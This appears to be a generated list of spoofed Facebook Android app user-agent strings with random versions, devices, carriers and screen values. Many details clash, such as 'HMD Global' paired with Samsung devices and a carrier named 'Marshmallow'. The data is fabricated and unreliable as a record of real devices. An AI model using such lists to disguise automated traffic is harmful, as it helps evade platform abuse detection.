"[FBAN/FB4A;FBAV/69.0.0.45.3;FBBV/50740417;FBDM/{density=8.8,width=587,height=1292};FBLC/en_PK;FBRV/27366985;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025G;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.26.6;FBBV/33422637;FBDM/{density=7.3,width=705,height=1203};FBLC/en_PK;FBRV/69662544;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A115U;FBSV/8.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/27.0.0.34.127;FBBV/74237889;FBDM/{density=1.1,width=1057,height=1992};FBLC/en_GB;FBRV/86684144;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S367VL;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/178.0.0.13.30;FBBV/91678454;FBDM/{density=9.8,width=1126,height=2822};FBLC/en_PK;FBRV/17855497;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730F;FBSV/6.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/248.0.0.78.32;FBBV/89996356;FBDM/{density=4.9,width=1012,height=2060};FBLC/en_US;FBRV/22111926;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A3051;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/48.0.0.22.2;FBBV/70906420;FBDM/{density=7.6,width=508,height=1366};FBLC/en_PK;FBRV/95215180;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727R4;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/391.0.0.18.160;FBBV/93578174;FBDM/{density=6.6,width=721,height=1835};FBLC/en_PK;FBRV/63583382;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M107F;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/11.0.0.54.23;FBBV/38733415;FBDM/{density=1.7,width=1409,height=2556};FBLC/en_PK;FBRV/66717744;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A205GN;FBSV/8.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/106.0.0.65.154;FBBV/27378617;FBDM/{density=5.7,width=1224,height=1382};FBLC/en_US;FBRV/19688056;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G981U;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/273.0.0.39.197;FBBV/99217707;FBDM/{density=7.7,width=572,height=1381};FBLC/en_GB;FBRV/61445463;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M017F;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/229.0.0.16.192;FBBV/85878864;FBDM/{density=9.9,width=940,height=1526};FBLC/en_US;FBRV/49531431;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G930S;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/207.0.0.76.150;FBBV/84944403;FBDM/{density=2.1,width=527,height=2645};FBLC/en_PK;FBRV/37762097;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J106M;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/106.0.0.93.137;FBBV/90478446;FBDM/{density=3.6,width=984,height=1158};FBLC/en_GB;FBRV/97593714;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A037G;FBSV/8.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/153.0.0.18.85;FBBV/85159964;FBDM/{density=9.7,width=1294,height=2813};FBLC/en_GB;FBRV/28219723;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120FN;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/175.0.0.93.70;FBBV/80370994;FBDM/{density=6.4,width=1210,height=1896};FBLC/en_PK;FBRV/57108645;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313U;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.55.74;FBBV/56689090;FBDM/{density=6.1,width=1293,height=1857};FBLC/en_PK;FBRV/56575114;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M205FN;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/189.0.0.72.106;FBBV/26567750;FBDM/{density=8.4,width=1451,height=2489};FBLC/en_US;FBRV/23509428;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S901B;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/88.0.0.36.89;FBBV/16211382;FBDM/{density=2.1,width=1355,height=1532};FBLC/en_US;FBRV/56384597;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J410F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/176.0.0.44.65;FBBV/91123886;FBDM/{density=2.7,width=823,height=1464};FBLC/en_US;FBRV/99254215;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500H;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/119.0.0.74.68;FBBV/24516355;FBDM/{density=2.9,width=655,height=2665};FBLC/en_PK;FBRV/35492225;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A135M;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/306.0.0.92.148;FBBV/58269821;FBDM/{density=1.6,width=1181,height=1549};FBLC/en_GB;FBRV/30735968;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G110B;FBSV/8.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/213.0.0.72.75;FBBV/95400769;FBDM/{density=2.5,width=658,height=2117};FBLC/en_PK;FBRV/83379620;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G531M;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/91.0.0.29.84;FBBV/17969443;FBDM/{density=2.8,width=729,height=2131};FBLC/en_US;FBRV/29940898;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500W;FBSV/9.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.61.96;FBBV/46553888;FBDM/{density=8.6,width=536,height=1102};FBLC/en_US;FBRV/97266250;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S767VL;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/384.0.0.34.176;FBBV/54058342;FBDM/{density=2.2,width=1289,height=1694};FBLC/en_GB;FBRV/66490143;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730F;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/419.0.0.66.58;FBBV/99652532;FBDM/{density=9.8,width=941,height=2769};FBLC/en_US;FBRV/54397413;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A215U1;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/353.0.0.94.87;FBBV/74457491;FBDM/{density=3.2,width=639,height=1893};FBLC/en_PK;FBRV/95910131;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M015F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/346.0.0.88.97;FBBV/68021478;FBDM/{density=5.8,width=747,height=1689};FBLC/en_GB;FBRV/82248438;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A9080;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/237.0.0.9.67;FBBV/44734646;FBDM/{density=2.8,width=1493,height=1324};FBLC/en_PK;FBRV/47254010;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G720AX;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/55.0.0.91.49;FBBV/38587183;FBDM/{density=2.2,width=925,height=1599};FBLC/en_US;FBRV/61932290;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9006V;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/267.0.0.86.76;FBBV/56507178;FBDM/{density=1.3,width=571,height=1902};FBLC/en_PK;FBRV/58846285;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J737T1;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/192.0.0.55.155;FBBV/99984631;FBDM/{density=5.2,width=598,height=1241};FBLC/en_US;FBRV/24310892;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A125M;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/413.0.0.85.179;FBBV/35490726;FBDM/{density=5.1,width=680,height=1105};FBLC/en_US;FBRV/42584919;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J730G;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/354.0.0.79.190;FBBV/31332785;FBDM/{density=2.6,width=1100,height=2758};FBLC/en_GB;FBRV/92367306;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500X;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/356.0.0.97.104;FBBV/23778031;FBDM/{density=2.9,width=599,height=1351};FBLC/en_US;FBRV/31871518;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A720F;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/137.0.0.28.106;FBBV/65103530;FBDM/{density=1.4,width=1040,height=2521};FBLC/en_GB;FBRV/19607779;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313MU;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/253.0.0.17.85;FBBV/33738761;FBDM/{density=1.1,width=677,height=1521};FBLC/en_GB;FBRV/65853975;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N971N;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/151.0.0.31.134;FBBV/51913734;FBDM/{density=2.2,width=1361,height=1354};FBLC/en_US;FBRV/14919040;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung M135M;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/264.0.0.16.69;FBBV/41501779;FBDM/{density=1.2,width=815,height=1716};FBLC/en_US;FBRV/68980837;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G920I;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/360.0.0.86.119;FBBV/76980212;FBDM/{density=3.4,width=656,height=1052};FBLC/en_US;FBRV/45656445;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N916S;FBSV/8.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/55.0.0.91.55;FBBV/52347406;FBDM/{density=9.2,width=1002,height=1080};FBLC/en_PK;FBRV/22402492;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A810S;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/309.0.0.86.191;FBBV/35718566;FBDM/{density=3.8,width=1460,height=2675};FBLC/en_US;FBRV/97519212;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G3815;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/424.0.0.63.47;FBBV/33984897;FBDM/{density=9.6,width=1046,height=1079};FBLC/en_PK;FBRV/33761290;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G313HU;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/270.0.0.5.21;FBBV/29246801;FBDM/{density=1.3,width=1327,height=2353};FBLC/en_GB;FBRV/54270877;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G770U1;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/135.0.0.99.30;FBBV/91123725;FBDM/{density=2.2,width=1484,height=2623};FBLC/en_GB;FBRV/14876527;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N986U;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/411.0.0.2.40;FBBV/52156703;FBDM/{density=6.3,width=885,height=2414};FBLC/en_GB;FBRV/29206730;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J810Y;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.17.119;FBBV/16878285;FBDM/{density=9.7,width=1373,height=2393};FBLC/en_PK;FBRV/15334329;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung S901U;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/64.0.0.46.144;FBBV/97292230;FBDM/{density=3.8,width=1212,height=2880};FBLC/en_GB;FBRV/31006974;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J105H;FBSV/7.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/137.0.0.42.84;FBBV/31492205;FBDM/{density=5.8,width=1079,height=2444};FBLC/en_GB;FBRV/82520464;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J120H;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/163.0.0.18.52;FBBV/82876553;FBDM/{density=8.6,width=1142,height=1713};FBLC/en_PK;FBRV/90002251;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A430F;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/99.0.0.31.192;FBBV/19276679;FBDM/{density=3.7,width=1209,height=2507};FBLC/en_PK;FBRV/80195608;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G550FY;FBSV/6.4;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/230.0.0.56.154;FBBV/28154804;FBDM/{density=1.2,width=1404,height=2956};FBLC/en_US;FBRV/70089564;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G973U1;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/204.0.0.8.72;FBBV/72163796;FBDM/{density=8.6,width=980,height=2759};FBLC/en_GB;FBRV/98126402;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N975U;FBSV/9.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/201.0.0.15.200;FBBV/12817349;FBDM/{density=1.5,width=1305,height=2670};FBLC/en_GB;FBRV/91838118;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727VPP;FBSV/7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/193.0.0.97.1;FBBV/88038137;FBDM/{density=4.8,width=809,height=2593};FBLC/en_US;FBRV/52951599;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G950W;FBSV/7.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/331.0.0.46.182;FBBV/96797618;FBDM/{density=3.1,width=1150,height=2242};FBLC/en_PK;FBRV/38707952;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G110B;FBSV/6.8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/383.0.0.79.192;FBBV/69125857;FBDM/{density=6.8,width=1219,height=2531};FBLC/en_GB;FBRV/96225438;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727P;FBSV/8.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/14.0.0.41.146;FBBV/86180354;FBDM/{density=7.3,width=1021,height=1793};FBLC/en_GB;FBRV/71244461;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A025AZ;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/89.0.0.33.152;FBBV/73678909;FBDM/{density=6.7,width=729,height=1552};FBLC/en_PK;FBRV/30087615;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500YZ;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/12.0.0.31.196;FBBV/93778277;FBDM/{density=8.4,width=1442,height=1552};FBLC/en_PK;FBRV/32628842;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E625F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/393.0.0.40.28;FBBV/80658623;FBDM/{density=5.3,width=613,height=2866};FBLC/en_PK;FBRV/45394961;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A516V;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/335.0.0.43.91;FBBV/85446875;FBDM/{density=1.8,width=873,height=1568};FBLC/en_GB;FBRV/98005645;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E236B;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/102.0.0.68.147;FBBV/35614532;FBDM/{density=6.9,width=1271,height=2647};FBLC/en_US;FBRV/26595541;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A115AZ;FBSV/6.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/379.0.0.31.190;FBBV/82036215;FBDM/{density=4.2,width=603,height=2565};FBLC/en_GB;FBRV/24434249;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A700F;FBSV/8.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/214.0.0.66.55;FBBV/56289396;FBDM/{density=8.6,width=1369,height=2718};FBLC/en_US;FBRV/60820686;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J100FN;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/422.0.0.56.51;FBBV/69273605;FBDM/{density=7.1,width=577,height=1563};FBLC/en_US;FBRV/12361044;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A750F;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/257.0.0.62.50;FBBV/76661679;FBDM/{density=5.8,width=940,height=1219};FBLC/en_GB;FBRV/65890502;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A032F;FBSV/6.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/159.0.0.34.33;FBBV/47007370;FBDM/{density=5.7,width=555,height=1505};FBLC/en_US;FBRV/67012066;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J530G;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/184.0.0.57.9;FBBV/64060603;FBDM/{density=5.1,width=1382,height=2431};FBLC/en_GB;FBRV/52755688;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A705MN;FBSV/9.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/324.0.0.96.73;FBBV/16047890;FBDM/{density=3.6,width=770,height=2538};FBLC/en_PK;FBRV/71061986;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G781U;FBSV/7.2;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/345.0.0.1.162;FBBV/83539191;FBDM/{density=8.5,width=1399,height=1490};FBLC/en_US;FBRV/34212790;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A526U1;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/251.0.0.25.34;FBBV/54102746;FBDM/{density=8.3,width=515,height=2757};FBLC/en_US;FBRV/42162734;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G6100;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/89.0.0.69.161;FBBV/32755355;FBDM/{density=3.4,width=1359,height=1503};FBLC/en_US;FBRV/94345863;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G318H;FBSV/6.7;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/289.0.0.14.186;FBBV/11292212;FBDM/{density=1.1,width=810,height=2128};FBLC/en_GB;FBRV/44810424;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G9880;FBSV/6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/381.0.0.39.197;FBBV/63172837;FBDM/{density=9.1,width=1445,height=2646};FBLC/en_PK;FBRV/21544519;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A505G;FBSV/6.5;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/293.0.0.31.150;FBBV/33905459;FBDM/{density=5.5,width=676,height=2226};FBLC/en_GB;FBRV/52159006;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J701M;FBSV/7.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/416.0.0.80.160;FBBV/17059434;FBDM/{density=5.8,width=1158,height=1063};FBLC/en_GB;FBRV/45245370;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A525F;FBSV/8;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/327.0.0.68.91;FBBV/61641298;FBDM/{density=8.7,width=1006,height=2832};FBLC/en_PK;FBRV/66793096;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J727VPP;FBSV/7.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/282.0.0.21.87;FBBV/28393628;FBDM/{density=9.3,width=1425,height=1304};FBLC/en_GB;FBRV/81685452;FBCR/Zong;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N916K;FBSV/6.0;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/254.0.0.56.10;FBBV/24881805;FBDM/{density=2.7,width=899,height=2984};FBLC/en_GB;FBRV/70834363;FBCR/Telekom China;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J600G;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/405.0.0.99.197;FBBV/85989881;FBDM/{density=3.2,width=1087,height=1352};FBLC/en_GB;FBRV/13243785;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J610FN;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/321.0.0.95.22;FBBV/30792987;FBDM/{density=6.2,width=849,height=2650};FBLC/en_US;FBRV/68532839;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung N930x;FBSV/6.3;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/346.0.0.85.40;FBBV/25730658;FBDM/{density=2.6,width=1467,height=2628};FBLC/en_US;FBRV/62685298;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J610G;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/206.0.0.47.169;FBBV/14081525;FBDM/{density=3.1,width=595,height=2476};FBLC/en_PK;FBRV/43014630;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A500X;FBSV/6.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/267.0.0.90.95;FBBV/41307914;FBDM/{density=9.8,width=593,height=2848};FBLC/en_US;FBRV/35980366;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A426B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/283.0.0.50.167;FBBV/48453015;FBDM/{density=1.6,width=980,height=1361};FBLC/en_US;FBRV/73909817;FBCR/Marshmallow;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A526U;FBSV/7.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/182.0.0.15.56;FBBV/79351698;FBDM/{density=7.2,width=738,height=1563};FBLC/en_GB;FBRV/56231285;FBCR/Ufone;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung G8870;FBSV/9.6;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/265.0.0.60.142;FBBV/42847631;FBDM/{density=9.5,width=757,height=2058};FBLC/en_US;FBRV/65192931;FBCR/Jazz;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung J327T1;FBSV/7.9;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/100.0.0.17.190;FBBV/49102673;FBDM/{density=4.4,width=894,height=2501};FBLC/en_US;FBRV/24472887;FBCR/null;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung A136U;FBSV/9.1;FBOP/1;FBCA/arm64-v8a:;]"
"[FBAN/FB4A;FBAV/68.0.0.65.89;FBBV/56646370;FBDM/{density=9.5,width=578,height=1868};FBLC/en_PK;FBRV/76690621;FBCR/Telenor;FBMF/HMD Global;FBBD/samsung;FBPN/com.facebook.katana;FBDV/Samsung E700M;FBSV/8.6;FBOP/1;FBCA/arm64-v8a:;]"
